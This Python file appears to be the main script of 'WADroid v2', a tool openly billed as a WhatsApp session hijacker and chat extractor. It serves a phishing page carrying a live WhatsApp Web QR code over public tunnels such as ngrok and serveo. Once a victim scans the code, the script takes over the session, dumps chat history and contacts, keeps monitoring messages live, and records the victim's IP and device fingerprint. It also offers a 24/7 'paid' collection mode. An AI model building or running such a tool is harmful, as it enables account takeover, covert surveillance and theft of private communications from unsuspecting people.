#!/usr/bin/env python3
"""
WADroid v2 — WhatsApp Session Hijack & Chat Extractor
Kali / Termux compatible • Local & Paid modes
"""

import os
import sys
import time
import signal
import shutil
import argparse
import threading
from pathlib import Path
from datetime import datetime

try:
    from colorama import init as _ci, Fore, Style
    _ci(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ""
    class Style:
        BRIGHT = RESET_ALL = ""

ROOT = Path(__file__).parent
sys.path.insert(0, str(ROOT))

from config import (
    OUTPUT_DIR, SESSION_DIR, STATIC_DIR, TEMPLATE_DIR,
    LISTEN_HOST, LISTEN_PORT, FLASK_SECRET,
    QR_REFRESH_SEC, SCRAPE_CYCLE_SEC, LOGIN_WAIT_SEC,
    NGROK_AUTH_TOKEN, MAX_CHATS_INITIAL, MAX_CHATS_LIVE, SCROLL_LOADS,
)
from core.browser import WhatsEngine
from core.extractor import ChatExtractor
from core.phish import PhishServer
from core.tunnels import TunnelBridge
from core.writer import DataWriter
from core.persist import SessionKeeper

# ── banner ─────────────────────────────────────────────────
BANNER = f"""
{Fore.GREEN}██╗    ██╗ █████╗ ██████╗ ██████╗  ██████╗ ██╗██████╗
{Fore.GREEN}██║    ██║██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗
{Fore.GREEN}██║ █╗ ██║███████║██║  ██║██████╔╝██║   ██║██║██║  ██║
{Fore.GREEN}██║███╗██║██╔══██║██║  ██║██╔══██╗██║   ██║██║██║  ██║
{Fore.GREEN}╚███╔███╔╝██║  ██║██████╔╝██║  ██║╚██████╔╝██║██████╔╝
{Fore.GREEN} ╚══╝╚══╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝{Fore.WHITE} v2.0
{Fore.CYAN}  WhatsApp Session Hijack & Chat Extractor
{Fore.YELLOW}  ─────────────────────────────────────────{Style.RESET_ALL}
"""


class WADroid:
    def __init__(self, mode: str, port: int, headless: bool):
        self.mode = mode
        self.port = port
        self.headless = headless
        self.alive = False

        # components (lazily initialized)
        self.engine: WhatsEngine | None = None
        self.extractor: ChatExtractor | None = None
        self.server: PhishServer | None = None
        self.tunnel: TunnelBridge | None = None
        self.writer = DataWriter(str(OUTPUT_DIR))
        self.keeper = SessionKeeper(str(SESSION_DIR))

        # runtime state
        self.link: str = ""
        self.hooked = False
        self.session_live = False
        self.msg_total = 0

    # ── pretty print ───────────────────────────────────────
    @staticmethod
    def _p(msg: str, c: str = Fore.WHITE):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f" {Fore.CYAN}[{ts}]{Style.RESET_ALL} {c}{msg}{Style.RESET_ALL}")

    # ── 1  server ──────────────────────────────────────────
    def _boot_server(self):
        self._p("Flask server laga raha hai...", Fore.YELLOW)
        self.server = PhishServer(
            host=LISTEN_HOST,
            port=self.port,
            static_dir=str(STATIC_DIR),
            template_dir=str(TEMPLATE_DIR),
            output_dir=str(OUTPUT_DIR),
        )
        self.server.launch()
        self._p(f"Server chalu — 0.0.0.0:{self.port}", Fore.GREEN)

    # ── 2  tunnel ──────────────────────────────────────────
    def _boot_tunnel(self):
        self.tunnel = TunnelBridge()

        if self.mode == "paid":
            self._p("Ngrok tunnel try...", Fore.YELLOW)
            url = self.tunnel.open_ngrok(self.port, NGROK_AUTH_TOKEN)
            if url:
                self.link = url
                self._p(f"Ngrok ready → {url}", Fore.GREEN)
                return

            self._p("Cloudflare tunnel try...", Fore.YELLOW)
            url = self.tunnel.open_cloudflare(self.port)
            if url:
                self.link = url
                self._p(f"Cloudflare ready → {url}", Fore.GREEN)
                return

        # free fallbacks
        self._p("Serveo tunnel try...", Fore.YELLOW)
        url = self.tunnel.open_serveo(self.port)
        if url:
            self.link = url
            self._p(f"Serveo ready → {url}", Fore.GREEN)
            return

        self._p("localhost.run tunnel try...", Fore.YELLOW)
        url = self.tunnel.open_lhr(self.port)
        if url:
            self.link = url
            self._p(f"localhost.run ready → {url}", Fore.GREEN)
            return

        self.link = f"http://localhost:{self.port}"
        self._p("Tunnel nahi mila — sirf local access.", Fore.RED)

    # ── 3  browser ─────────────────────────────────────────
    def _boot_browser(self):
        self._p("Chrome engine start ho raha hai...", Fore.YELLOW)
        profile = str(SESSION_DIR / "chrome_profile")
        self.engine = WhatsEngine(profile_path=profile, headless=self.headless)
        self.engine.ignite()
        self._p("WhatsApp Web load ho raha hai...", Fore.GREEN)
        time.sleep(4)

    # ── 4  QR grab ─────────────────────────────────────────
    def _grab_qr(self) -> bool:
        dest = str(STATIC_DIR / "qr.png")
        self._p("QR code capture kar raha hai...", Fore.YELLOW)
        for _ in range(40):
            if self.engine.check_logged_in():
                self._p("Pehle se logged in — QR skip.", Fore.GREEN)
                return True
            if self.engine.grab_qr_png(dest):
                self._p("QR captured ✔", Fore.GREEN)
                return True
            time.sleep(2)
        self._p("QR capture fail.", Fore.RED)
        return False

    # ── 5  QR refresh daemon ───────────────────────────────
    def _qr_daemon(self):
        dest = str(STATIC_DIR / "qr.png")
        while self.alive and not self.session_live:
            if self.engine.check_logged_in():
                self.session_live = True
                self._p("TARGET NE SCAN KIYA! Session hijacked ✔", Fore.GREEN + Style.BRIGHT)
                break
            self.engine.grab_qr_png(dest)
            time.sleep(QR_REFRESH_SEC)

    # ── 6  scraping loop ───────────────────────────────────
    def _scrape_loop(self):
        self.extractor = ChatExtractor(self.engine.driver)

        # ── initial deep harvest
        self._p("Full chat history nikal raha hai...", Fore.YELLOW)
        haul = self.extractor.harvest_all(limit=MAX_CHATS_INITIAL, scroll=SCROLL_LOADS)
        if haul:
            self.writer.save_chats(haul, tag="initial")
            n = sum(len(v) for v in haul.values())
            self.msg_total += n
            self._p(f"Initial: {len(haul)} chats, {n} messages saved.", Fore.GREEN)

        # ── contacts dump
        cl = self.extractor.list_contacts()
        if cl:
            self.writer.save_contacts(cl)
            self._p(f"{len(cl)} contacts file mai save.", Fore.GREEN)

        # ── continuous live loop
        self._p("Live monitoring shuru...", Fore.MAGENTA)
        while self.alive and self.session_live:
            try:
                time.sleep(SCRAPE_CYCLE_SEC)

                if not self.engine.check_logged_in():
                    self._p("Session gir gayi!", Fore.RED)
                    if self.mode == "paid":
                        self._p("Reconnect wait...", Fore.YELLOW)
                        time.sleep(15)
                        continue
                    else:
                        break

                fresh = self.extractor.live_pass(limit=MAX_CHATS_LIVE)
                if fresh:
                    self.writer.save_chats(fresh, tag="live")
                    cnt = sum(len(v) for v in fresh.values())
                    self.msg_total += cnt

                    # terminal feed
                    for contact, msgs in fresh.items():
                        for m in msgs:
                            arrow = ">>>" if m["dir"] == "out" else "<<<"
                            col = Fore.MAGENTA if m["dir"] == "out" else Fore.WHITE
                            self._p(f"{arrow} [{contact}] {m['text'][:70]}", col)

                    self._p(f"Live +{cnt} msgs  (total {self.msg_total})", Fore.GREEN)

                # persist state
                self.keeper.snapshot({
                    "logged_in": True,
                    "msgs_scraped": self.msg_total,
                    "mode": self.mode,
                    "link": self.link,
                    "contacts": len(cl),
                })

            except KeyboardInterrupt:
                break
            except Exception as exc:
                self._p(f"Scrape error: {exc}", Fore.RED)
                time.sleep(8)

    # ── full attack ────────────────────────────────────────
    def attack(self):
        self.alive = True
        try:
            self._boot_server()
            self._boot_tunnel()
            self._boot_browser()

            if not self._grab_qr():
                return

            # show link
            print(f"\n {Fore.GREEN}{'━'*52}")
            print(f" {Fore.YELLOW} TARGET LINK: {Fore.WHITE}{Style.BRIGHT}{self.link}")
            print(f" {Fore.GREEN}{'━'*52}")
            print(f" {Fore.CYAN} Ye link bhejo — jab scan karega sab milega.{Style.RESET_ALL}\n")

            # qr refresh thread
            qr_t = threading.Thread(target=self._qr_daemon, daemon=True)
            qr_t.start()

            # wait for hook
            self._p("Target ka intezaar...", Fore.YELLOW)
            while self.alive and not self.session_live:
                if self.server.hits and not self.hooked:
                    h = self.server.hits[-1]
                    self.hooked = True
                    self._p(f"HOOKED! IP → {h['ip']}", Fore.GREEN + Style.BRIGHT)
                    self.writer.save_target(h)
                time.sleep(2)

            if not self.session_live:
                return

            self.engine.dump_session_meta()
            self._p("Session persist ho gayi.", Fore.GREEN)
            self._scrape_loop()

        except KeyboardInterrupt:
            self._p("\nRuk raha hai...", Fore.YELLOW)
        finally:
            self._shutdown()

    # ── resume ─────────────────────────────────────────────
    def resume(self):
        self.alive = True
        state = self.keeper.restore()
        if not state:
            self._p("Koi saved session nahi!", Fore.RED)
            return

        self._p(f"Resume — last {state.get('msgs_scraped',0)} msgs, mode={state.get('mode','?')}", Fore.YELLOW)

        try:
            self._boot_server()
            self._boot_tunnel()
            self._boot_browser()
            time.sleep(5)

            if self.engine.check_logged_in():
                self.session_live = True
                self._p("Session active! Scraping resume...", Fore.GREEN)
                print(f" {Fore.YELLOW}LINK: {self.link}{Style.RESET_ALL}\n")
                self._scrape_loop()
            else:
                self._p("Session expire. Naya attack karo.", Fore.RED)
        except KeyboardInterrupt:
            pass
        finally:
            self._shutdown()

    # ── view collected data ────────────────────────────────
    def show_data(self):
        print(f"\n {Fore.CYAN}╔══ Collected Data ══╗{Style.RESET_ALL}")
        for fp in [self.writer.f_chats, self.writer.f_live,
                    self.writer.f_contacts, self.writer.f_target]:
            if fp.exists():
                sz = fp.stat().st_size
                ln = len(fp.read_text(encoding="utf-8").splitlines())
                print(f" {Fore.GREEN} ✔ {fp.name}: {ln} lines ({sz:,} bytes){Style.RESET_ALL}")
            else:
                print(f" {Fore.RED} ✘ {fp.name}: not found{Style.RESET_ALL}")
        st = self.keeper.restore()
        if st:
            print(f"\n {Fore.YELLOW} Last state:{Style.RESET_ALL}")
            for k, v in st.items():
                print(f"   {k}: {v}")
        print()

    # ── shutdown ───────────────────────────────────────────
    def _shutdown(self):
        self.alive = False
        self._p("Sab band ho raha hai...", Fore.YELLOW)
        if self.engine:
            self.engine.dump_session_meta()
            self.engine.kill()
        if self.tunnel:
            self.tunnel.close()
        self.keeper.snapshot({
            "logged_in": self.session_live,
            "msgs_scraped": self.msg_total,
            "mode": self.mode,
            "link": self.link,
        })
        self._p(f"WADroid off. Data → {OUTPUT_DIR}/", Fore.GREEN)


# ═══════════════════════════════════════════════════════════
#   CLI
# ═══════════════════════════════════════════════════════════
def cli():
    print(BANNER)

    ap = argparse.ArgumentParser(
        description="WADroid v2 — WhatsApp Hijacker",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    ap.add_argument("-m", "--mode", choices=["local", "paid"], default="local",
                    help="local  = free, stops when machine off\npaid   = persistent VPS/ngrok mode")
    ap.add_argument("-p", "--port", type=int, default=LISTEN_PORT, help="Server port (default 8585)")
    ap.add_argument("--visible", action="store_true", help="Show browser window (debugging)")
    ap.add_argument("--resume", action="store_true", help="Resume previous session")
    ap.add_argument("--view", action="store_true", help="View collected data")
    ap.add_argument("--clean", action="store_true", help="Wipe sessions + output")
    ap.add_argument("--ngrok-token", type=str, default="", help="Ngrok auth token")

    args = ap.parse_args()

    if args.ngrok_token:
        import config
        config.NGROK_AUTH_TOKEN = args.ngrok_token

    wd = WADroid(mode=args.mode, port=args.port, headless=not args.visible)

    if args.clean:
        wd.keeper.wipe()
        if OUTPUT_DIR.exists():
            shutil.rmtree(OUTPUT_DIR, ignore_errors=True)
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        print(f" {Fore.GREEN}Sab saaf!{Style.RESET_ALL}")
        return

    if args.view:
        wd.show_data()
        return

    if args.resume:
        wd.resume()
        return

    # ── mode info
    if args.mode == "local":
        print(f" {Fore.YELLOW}┌─ LOCAL MODE ─────────────────────────┐")
        print(f" {Fore.WHITE}│ • Click-time chats + IP              │")
        print(f" {Fore.WHITE}│ • Machine off = attack off           │")
        print(f" {Fore.WHITE}│ • Free tunnels (serveo/lhr)          │")
        print(f" {Fore.YELLOW}└──────────────────────────────────────┘{Style.RESET_ALL}")
    else:
        print(f" {Fore.GREEN}┌─ PAID MODE ──────────────────────────┐")
        print(f" {Fore.WHITE}│ • Continuous live chat extraction     │")
        print(f" {Fore.WHITE}│ • VPS pe chalo = 24/7 collection     │")
        print(f" {Fore.WHITE}│ • Full device fingerprint + IP       │")
        print(f" {Fore.WHITE}│ • Auto-reconnect on session drop     │")
        print(f" {Fore.WHITE}│ • Ngrok / Cloudflare stable tunnels  │")
        print(f" {Fore.GREEN}└──────────────────────────────────────┘{Style.RESET_ALL}")

    print(f"\n {Fore.YELLOW}ENTER dabao shuru karne ke liye...{Style.RESET_ALL}")
    input()

    signal.signal(signal.SIGINT, lambda s, f: wd._shutdown())
    wd.attack()


if __name__ == "__main__":
    cli()